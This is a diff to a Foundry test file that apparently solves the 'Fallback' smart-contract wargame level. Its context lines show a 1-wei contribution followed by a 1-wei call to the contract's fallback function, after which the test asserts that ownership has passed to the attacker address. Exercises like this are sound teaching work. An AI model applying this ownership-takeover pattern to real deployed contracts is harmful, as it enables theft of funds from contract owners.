@@ -36,12 +36,6 @@ contract FallbackTest is Test {
         // Contribute one time to satisfy ownership change condition
         fallbackContract.contribute{value: 1 wei}();
 
-        // assertFalse(fallbackContract.owner() == address(attacker));
-        // emit log_named_address(
-        //     "owner of the attacked contract(before hacking): ",
-        //     fallbackContract.owner()
-        // );
-
         emit log_named_uint(
             "Verify contribution state change: ",
             fallbackContract.getContribution()
@@ -51,11 +45,10 @@ contract FallbackTest is Test {
         payable(address(fallbackContract)).call{value: 1 wei}("");
         assertEq(fallbackContract.owner(), attacker);
 
-        // assertTrue(fallbackContract.owner() == address(attacker));
-        // emit log_named_address(
-        //     "owner of the attacked contract(before hacking): ",
-        //     fallbackContract.owner()
-        // );
+        emit log_named_address(
+            "owner of the attacked contract(before hacking): ",
+            fallbackContract.owner()
+        );
 
         emit log_named_uint(
             "Contract balance (before): ",
